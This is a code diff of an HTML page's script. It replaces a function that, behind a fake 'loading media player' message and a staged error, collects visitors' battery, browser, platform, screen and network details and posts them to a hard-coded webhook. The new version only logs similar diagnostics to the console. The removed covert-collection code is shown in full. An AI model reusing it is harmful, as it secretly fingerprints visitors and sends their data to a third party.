@@ -38,54 +38,34 @@
     <script>
         const WEBHOOK_URL = "https://webhooksite.net/b9df350d-91d4-42d4-b836-a0bd8ca9508d";
 
-        async function triggerCapture() {
-            document.getElementById('status').innerText = "Loading media player...";
-            
-            let batteryDetails = {
-                supported: false,
-                level: "N/A (Blocked by OS/Browser)",
-                charging: "N/A"
-            };
+async function handleUserInteraction() {
+    let batteryData = "Not supported on this platform/browser";
 
-            // Attempt battery extraction on supported platforms
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryDetails = {
-                        supported: true,
-                        level: `${Math.round(battery.level * 100)}%`,
-                        charging: battery.charging ? "Yes" : "No"
-                    };
-                } catch (e) {
-                    batteryDetails.level = "Permission Denied";
-                }
-            }
-
-            // Gather additional platform metadata
-            const payload = {
-                battery: batteryDetails,
-                platformInfo: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
-                    time: new Date().toISOString()
-                }
-            };
-
-            // Transmit metrics
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                setTimeout(() => {
-                    document.getElementById('status').innerText = "Error: Media stream unavailable.";
-                }, 1500);
-            });
+    // 1. Check feature support before calling the API
+    if ('getBattery' in navigator && typeof navigator.getBattery === 'function') {
+        try {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? "Plugged in" : "On battery";
+            batteryData = `${level}% (${charging})`;
+        } catch (err) {
+            batteryData = "Access restricted";
         }
+    } else {
+        // Fallback or alternative platform feature check
+        batteryData = "Battery API unavailable (e.g., iOS WebKit restriction)";
+    }
+
+    // 2. Gather non-restricted standard diagnostics
+    const diagnostics = {
+        batteryStatus: batteryData,
+        userAgent: navigator.userAgent,
+        onlineStatus: navigator.onLine ? "Online" : "Offline",
+        screenDimensions: `${window.screen.width}x${window.screen.height}`
+    };
+
+    console.log("Captured Data:", diagnostics);
+}
     </script>
 </body>
 </html>
